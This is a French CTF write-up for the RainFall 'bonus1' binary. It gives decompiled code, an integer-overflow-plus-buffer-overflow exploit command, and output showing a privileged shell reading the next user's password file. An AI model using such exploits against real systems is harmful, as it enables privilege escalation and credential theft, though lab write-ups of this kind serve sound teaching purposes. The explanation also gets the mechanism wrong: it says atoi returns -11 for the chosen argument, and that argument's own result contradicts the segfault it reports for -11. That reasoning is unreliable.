# Exploitation de bonus1 - Readme détaillé

## Présentation du problème

Le binaire "bonus1" présente une vulnérabilité de dépassement de tampon (buffer overflow) qui peut être exploitée pour obtenir un shell avec des privilèges élevés.

## Analyse du code

```c
int main(int argc, const char **argv)
{
  char dest[40];
  int v5;
  
  v5 = atoi(argv[1]);
  if ( v5 > 9 )
    return 1;
  memcpy(dest, argv[2], 4 * v5);
  if ( v5 == 1464814662 )
    execl("/bin/sh", "sh", 0);
  return 0;
}
```

## Vulnérabilités identifiées

1. Vérification insuffisante de la valeur d'entrée (v5)
2. Utilisation non sécurisée de memcpy() permettant un dépassement de tampon
3. Comparaison directe de v5 avec une valeur spécifique pour l'exécution du shell

## Configuration de sécurité

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
```

Toutes les protections sont désactivées, facilitant l'exploitation.

## Stratégie d'exploitation

1. Contourner la vérification `if ( v5 > 9 )`
2. Utiliser le dépassement de tampon pour écraser v5
3. Définir v5 à 1464814662 (0x574F4C46) pour déclencher l'exécution du shell

## Exploit

```bash
./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
```

## Explication détaillée

1. `-2147483637` comme premier argument :
   - Cette valeur est choisie car atoi("-2147483637") retourne -11
   - -11 est inférieur à 9, passant ainsi la vérification initiale

2. Le deuxième argument est construit comme suit :
   - 40 "A" pour remplir le tampon dest
   - "\x46\x4c\x4f\x57" (WOLF en little-endian) pour écraser v5 avec 1464814662

3. Dans memcpy(dest, argv[2], 4 * v5) :
   - 4 * (-11) est interprété comme un grand nombre positif (4294967252) en raison du dépassement d'entier non signé
   - Cela permet d'écrire au-delà de dest et d'écraser v5

## Résultats de l'exploitation

```
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

## Observations importantes

1. La tentative avec `4294967285` comme premier argument a échoué car cette valeur est supérieure à 9.
2. L'essai avec `-11` a provoqué une erreur de segmentation, probablement parce que la manipulation de la mémoire n'était pas suffisante pour atteindre et modifier correctement v5.
3. L'exploit final avec `-2147483637` a réussi, permettant d'obtenir un shell avec les privilèges de bonus2.

## Conclusion

Cette exploitation démontre l'importance de :
- Valider rigoureusement les entrées utilisateur
- Utiliser des fonctions sécurisées pour la manipulation de mémoire
- Activer les protections de sécurité du compilateur et du système
